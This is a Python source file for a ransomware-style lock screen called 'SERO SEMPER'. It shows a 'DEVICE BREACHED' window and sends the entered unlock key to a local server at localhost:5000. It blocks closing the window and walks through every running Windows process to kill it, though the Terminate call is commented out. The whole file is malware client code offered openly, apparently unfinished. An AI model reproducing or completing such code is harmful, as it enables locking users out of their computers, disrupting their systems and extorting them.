import customtkinter
import threading
import time
import sys
import os
import requests
from PIL import ImageTk, Image
import tkinter as tk
import psutil
import subprocess
import wmi

def center_window(window, width, height):
    # Get the screen width and height
    screen_width = window.winfo_screenwidth()
    screen_height = window.winfo_screenheight()

    # Calculate the x and y coordinates for the centered window
    x = (screen_width - width) // 2
    y = (screen_height - height) // 2

    # Set the window's geometry to be centered on the screen
    window.geometry(f"{width}x{height}+{x}+{y}")

class App(customtkinter.CTk):
    def __init__(self):
        super().__init__()

        center_window(self, 400, 400)
        self.iconbitmap("logo.ico")
        self.title("SERO SEMPER")
        

        pil_image = Image.open("logomain_notransparent.png")
        new_size = (160, 160)
        resized_image = pil_image.resize(new_size, Image.Resampling.BILINEAR)
        self.img = ImageTk.PhotoImage(resized_image)
        self.panel = tk.Label(self, image = self.img, width=150, height=150)
        self.message = customtkinter.CTkLabel(self, text="DEVICE BREACHED", font=customtkinter.CTkFont(size=20, weight="bold"))
        self.button = customtkinter.CTkButton(self, text="UNLOCK", command=self.button_callbck)
        self.input_box = customtkinter.CTkEntry(self, width=100)
        
        self.loading_bar = customtkinter.CTkProgressBar(self, width=300)
        self.loading_bar.pack(side="bottom", pady=10)
        self.loading_bar.configure(mode="indeterminnate")
        self.loading_bar.start()
        
        
        self.panel.pack(side="top")
        self.message.pack(side="top", pady=10)
        self.button.pack(padx=20, pady=5)
        self.input_box.pack(padx=20, pady=5)

        self.resizable(False, False)
        self.protocol("WM_DELETE_WINDOW", self.re_launch)
        self.terminate_all()
        self.mainloop()
        

    def button_callbck(self):
        def unlock_thread(self):
            try:
                key = self.input_box.get()
                print(f"CLIENT ATTEMPTING UNLOCK WITH KEY: {key}")
                requests.post("http://localhost:5000/unlock", data={"key": key})
            except Exception as e:
                print(f"FAILED TO UNLOCK: {e}")
        threading.Thread(target=unlock_thread, args=(self,)).start()

    def re_launch(self):
        print("CLIENT ATTEMPTING CLOSE")
        self.mainloop()

    def terminate_all(self):
        # Kill all open/active processes
        f = wmi.WMI()
        for process in f.Win32_Process():
            try:
                print(process)
                #process.Terminate()
            except Exception as e:
                print(f"FAILED TO KILL PROCESS: {e}")
        # Open a single exe using subprocess
        #subprocess.Popen("C:\\path\\to\\exe.exe")

app = App()
